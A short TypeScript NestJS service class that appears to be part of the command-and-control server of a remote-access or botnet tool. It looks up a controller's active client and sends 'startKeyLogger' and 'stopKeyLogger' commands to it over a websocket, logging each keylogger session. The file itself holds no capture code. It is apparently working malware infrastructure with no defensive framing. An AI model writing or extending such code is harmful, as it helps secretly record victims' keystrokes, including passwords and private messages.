import { KeyLoggerRepository } from "@/src/modules/client/domain/keylogger.repository";
import { WsClientRepository } from "@/src/modules/ws-client/domain/ws-client.repository";
import { ControllerRepository } from "@/src/repository/controller/controller.repository";
import { Injectable } from "@nestjs/common";

@Injectable()
export class WsBotKeyLoggerUseCase {
  constructor(
    private readonly keyLoggerRepository: KeyLoggerRepository,
    private readonly controllerRepository: ControllerRepository,
    private readonly wsClientRepository: WsClientRepository,
  ) {}

  async startListening(controllerid: string) {
    const { activeclient } =
      await this.controllerRepository.getControllerById(controllerid);

    this.keyLoggerRepository.createKeyLogger(activeclient);

    const client = this.wsClientRepository.getClient(activeclient);

    if (!client) {
      throw new Error("Client not found");
    }

    client.socket.emit("startKeyLogger");
  }

  async stopListening(controllerid: string) {
    const { activeclient } =
      await this.controllerRepository.getControllerById(controllerid);

    this.keyLoggerRepository.stopKeyLogger(activeclient);

    const client = this.wsClientRepository.getClient(activeclient);

    if (!client) {
      throw new Error("Client not found");
    }

    client.socket.emit("stopKeyLogger");
  }
}
